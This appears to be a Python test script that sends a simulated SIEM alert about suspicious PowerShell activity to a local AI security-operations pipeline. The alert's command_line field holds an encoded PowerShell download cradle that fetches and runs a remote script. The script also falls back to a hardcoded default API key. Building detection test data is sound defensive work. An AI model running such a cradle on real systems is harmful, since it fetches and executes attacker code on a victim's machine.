"""
Test Alert Script - Sends a realistic alert to trigger the full AI pipeline
Run this after starting the backend to see all logs in the Debug Dashboard
"""
import requests
import json
import os

# Configuration
API_URL = "http://localhost:5000/ingest"
API_KEY = os.getenv("INGEST_API_KEY", "secure-ingest-key-123")

# Realistic test alert (simulates Splunk/SIEM output)
test_alert = {
    "search_name": "Suspicious PowerShell Execution Detected",
    "alert_name": "PowerShell Download Cradle - Possible Malware",
    "description": "PowerShell process executed with encoded command downloading content from external IP. Command included -EncodedCommand flag with Base64 payload attempting to download and execute remote script.",
    "severity": "high",
    "source": "endpoint",
    "host": "WORKSTATION-PC42",
    "user": "jsmith",
    "src_ip": "192.168.1.105",
    "dest_ip": "45.33.32.156",
    "process_name": "powershell.exe",
    "command_line": "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4AMwAzAC4AMwAyAC4AMQA1ADYALwBtAGEAbAB3AGEAcgBlAC4AcABzADEAJwApAA==",
    "parent_process": "explorer.exe",
    "timestamp": "2026-01-26T11:25:00Z",
    "raw_event": {
        "EventCode": 4688,
        "ProcessId": 7892,
        "ParentProcessId": 4520
    }
}

def send_test_alert():
    print("=" * 60)
    print("🚀 SENDING TEST ALERT TO AI-SOC WATCHDOG")
    print("=" * 60)
    
    print(f"\n📋 Alert Details:")
    print(f"   Name: {test_alert['alert_name']}")
    print(f"   Severity: {test_alert['severity']}")
    print(f"   Host: {test_alert['host']}")
    print(f"   User: {test_alert['user']}")
    
    headers = {
        "Content-Type": "application/json",
        "X-API-Key": API_KEY
    }
    
    try:
        print(f"\n📡 Sending POST to {API_URL}...")
        response = requests.post(
            API_URL,
            json=test_alert,
            headers=headers,
            timeout=30
        )
        
        print(f"\n📬 Response Status: {response.status_code}")
        
        if response.status_code == 200:
            data = response.json()
            print(f"\n✅ SUCCESS!")
            print(f"   Alert ID: {data.get('alert_id', 'N/A')}")
            print(f"   Status: {data.get('status', 'N/A')}")
            print(f"   Message: {data.get('message', 'N/A')}")
            
            print("\n" + "=" * 60)
            print("🔍 CHECK THE SYSTEM DEBUG DASHBOARD NOW!")
            print("   http://localhost:5174/debug")
            print("   You should see the complete alert processing flow:")
            print("   - POST /ingest")
            print("   - parse_splunk_alert()")
            print("   - map_to_mitre()")
            print("   - classify_severity()")
            print("   - store_alert()")
            print("   - Queue routing")
            print("   - AI analysis phases (when processed)")
            print("=" * 60)
        else:
            print(f"\n❌ ERROR: {response.text}")
            
    except requests.exceptions.ConnectionError:
        print("\n❌ ERROR: Cannot connect to backend!")
        print("   Make sure the backend is running: py app.py")
    except Exception as e:
        print(f"\n❌ ERROR: {e}")

if __name__ == "__main__":
    send_test_alert()
